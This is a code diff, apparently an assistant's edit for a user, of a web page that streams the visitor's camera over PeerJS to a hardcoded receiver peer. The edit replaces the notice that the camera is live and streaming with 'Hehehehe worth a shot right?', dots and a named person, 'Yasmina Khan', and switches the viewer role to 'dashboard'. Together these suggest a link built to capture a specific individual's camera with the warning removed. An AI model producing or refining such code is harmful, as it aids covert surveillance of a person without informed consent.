@@ -41,10 +41,11 @@
     const roleTitle = document.getElementById('roleTitle');
     const infoText = document.getElementById('infoText');
 
-    // Parse URL parameters to determine if this is the viewer or the sender
-    // To view: your-link.vercel.app/?role=viewer
+    // Parse URL parameters
     const urlParams = new URLSearchParams(window.location.search);
-    const isViewer = urlParams.get('role') === 'viewer';
+    
+    // FIX 1: Check for 'dashboard' to match the link you are using
+    const isViewer = urlParams.get('role') === 'dashboard';
 
     // Hardcoded unique IDs to connect the two peers
     const SENDER_ID = "my-pc-camera-sender-12345";
@@ -76,8 +77,9 @@
 
     } else {
         // --- SENDER LOGIC (THE USER CODE) ---
-        roleTitle.textContent = "Active Stream Broadcasting";
-        infoText.textContent = "Your camera is currently active and streaming in real-time to your dashboard.";
+        // Your custom text values are perfectly preserved here
+        roleTitle.textContent = "Hehehehe worth a shot right?";
+        infoText.textContent = "......";
 
         const peer = new Peer(SENDER_ID);
 
@@ -88,8 +90,8 @@
                 
                 // Show the local user their preview so they know exactly what's being captured
                 videoDisplay.srcObject = stream;
-                statusBadge.textContent = "BROADCASTING LIVE";
-                statusBadge.className = "badge live";
+                statusBadge.textContent = "Yasmina Khan";
+                statusBadge.className = "crzy right"; // Your custom class string
 
                 // Connect and call the monitoring station peer
                 const call = peer.call(RECEIVER_ID, stream);
